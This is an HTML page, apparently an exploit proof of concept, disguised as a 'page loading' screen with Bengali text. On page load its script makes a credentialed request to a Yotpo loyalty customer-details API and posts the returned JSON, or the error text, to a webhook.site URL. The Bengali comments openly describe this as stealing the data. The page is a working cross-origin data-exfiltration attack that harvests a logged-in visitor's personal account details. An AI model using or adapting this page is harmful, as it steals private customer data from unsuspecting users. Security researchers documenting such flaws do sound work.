<!DOCTYPE html>
<html>
<head><title>Processing...</title></head>
<body>
    <script>
        const myWebhook = "https://webhook.site/bb29ec8b-4687-4463-a63c-9468fd24d200"; 

        // ১. সরাসরি কাস্টমার ডিটেইলস এর API হিট করা
        // এটি সরাসরি JSON ডাটা ফেরত দেয় যা চুরি করা সহজ
        fetch("https://loyalty.yotpo.com/api/v1/customer_details", {credentials: 'include'})
        .then(res => res.json())
        .then(data => {
            // ২. সংগৃহীত JSON ডাটা আপনার Webhook-এ পাঠিয়ে দেওয়া
            fetch(myWebhook, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });
        })
        .catch(err => {
            fetch(myWebhook, {
                method: 'POST',
                mode: 'no-cors',
                body: "Error: " + err
            });
        });
    </script>
    <h2>পেজটি লোড হচ্ছে...</h2>
</body>
</html>
